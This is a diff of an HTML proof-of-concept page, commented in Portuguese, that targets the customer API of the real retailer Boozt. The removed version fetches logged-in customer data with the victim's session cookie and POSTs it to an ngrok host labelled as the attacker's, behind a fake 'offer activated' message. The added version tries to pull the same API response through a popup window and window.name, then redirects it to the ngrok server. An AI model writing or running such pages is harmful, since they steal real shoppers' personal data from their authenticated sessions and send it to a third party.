@@ -1,40 +1,22 @@
+<!-- arquivo: inicio.html -->
 <!DOCTYPE html>
 <html>
+<head><meta charset="utf-8"></head>
 <body>
-    <script>
-        // Função pra coletar os dados do sessionStorage
-        function stealData() {
-            const customerData = sessionStorage.getItem("customer");
-            if (customerData) {
-                // Dados já estão no sessionStorage, envia direto
-                sendToAttacker(customerData);
-            } else {
-                // Se não tiver, força a requisição pro endpoint
-                const xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://www.boozt.com/at/de-at/api/customer", true);
-                xhr.withCredentials = true; // Envia o PHPSESSID
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        const data = xhr.responseText;
-                        sessionStorage.setItem("customer", data); // Simula o armazenamento
-                        sendToAttacker(data);
-                    }
-                };
-                xhr.send();
-            }
-        }
+  <script>
+    // Abre aba lateral com a Boozt
+    const win = window.open("https://www.boozt.com/at/de-at/api/customer", "poc");
 
-        // Função pra enviar os dados pro atacante (ngrok)
-        function sendToAttacker(data) {
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://7e4a-2804-4580-1080-7db-1219-7096-73d0-a45e.ngrok-free.app/collect", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(data);
-            document.body.innerHTML = "Oferta ativada! Confira os detalhes.";
-        }
-
-        // Executa ao carregar
-        stealData();
-    </script>
+    setTimeout(() => {
+      try {
+        // Injetar o conteúdo da resposta no window.name
+        win.name = win.document.body.innerText;
+        // Redirecionar pro servidor do atacante
+        win.location = "https://7e4a-2804-4580-1080-7db-1219-7096-73d0-a45e.ngrok-free.app/save";
+      } catch (e) {
+        console.error("⚠️ Erro ao manipular janela: ", e);
+      }
+    }, 4000); // tempo pra carregar o JSON da Boozt
+  </script>
 </body>
 </html>
